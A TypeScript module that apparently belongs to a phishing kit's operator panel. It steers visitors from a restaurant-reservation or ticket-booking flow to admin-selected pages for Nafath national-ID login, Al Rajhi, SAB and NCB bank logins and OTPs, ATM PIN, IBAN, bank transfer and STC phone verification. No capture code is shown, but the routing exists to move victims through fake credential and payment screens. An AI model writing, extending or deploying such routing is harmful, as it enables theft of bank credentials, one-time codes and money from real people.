export type DirectedVisitorData = {
  type?: string;
  restaurant?: unknown;
  restaurantEn?: unknown;
  currentPage?: string;
  phoneOtpApprovalStatus?: string;
  phoneOtpApproved?: boolean;
};

const TICKET_STEP_TO_PATH: Record<number, string> = {
  1: "/booking",
  2: "/checkout",
  3: "/otp",
  4: "/verify-mobile",
  5: "/phone-otp",
  6: "/confirmation",
};

const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
  5: "/otp",
  6: "/confirmation",
};

export function isRestaurantVisitor(data: DirectedVisitorData): boolean {
  const currentPage = String(data.currentPage || "");
  return (
    String(data.type || "").toLowerCase() === "restaurant_reservation" ||
    Boolean(data.restaurant) ||
    Boolean(data.restaurantEn) ||
    currentPage === "reserve_checkout" ||
    currentPage === "reserve_otp" ||
    currentPage.startsWith("reserve_")
  );
}

export function getDirectedTargetPath(
  step: number,
  data: DirectedVisitorData,
): string | null {
  const isRest = isRestaurantVisitor(data);
  const map = isRest ? RESTAURANT_STEP_TO_PATH : TICKET_STEP_TO_PATH;
  let target = map[step] || null;
  if (
    !isRest &&
    step === 5 &&
    (data.phoneOtpApprovalStatus === "approved" ||
      data.phoneOtpApproved === true ||
      data.currentPage === "nafath_login" ||
      data.currentPage === "nafath_verify")
  ) {
    target = "/nafath-login";
  }
  return target;
}

/** Resolve an admin-selected public route while rejecting privileged/external paths. */
export function getDirectedVisitorPath(path: unknown): string | null {
  if (typeof path !== "string") return null;
  const normalized = path.trim();
  if (!normalized.startsWith("/") || normalized.startsWith("//")) return null;
  const pathname = normalized.split(/[?#]/, 1)[0];
  if (
    pathname === "/" ||
    pathname === "/dashboard" ||
    pathname === "/login" ||
    pathname.startsWith("/api/")
  ) return null;
  const allowed = [
    "/home",
    "/booking",
    "/checkout",
    "/verify-mobile",
    "/mobile-verify",
    "/mobile-otp",
    "/phone-otp",
    "/nafath-login",
    "/nafath-verify",
    "/rajhi-login",
    "/rajhi-otp",
    "/atm-pin",
    "/iban",
    "/bank-transfer",
    "/sab-account",
    "/stc-call",
    "/stc-otp",
    "/provider-call",
    "/ncb-otp",
    "/otp",
    "/confirmation",
  ];
  return allowed.some((prefix) => pathname === prefix || pathname.startsWith(prefix)) ? normalized : null;
}
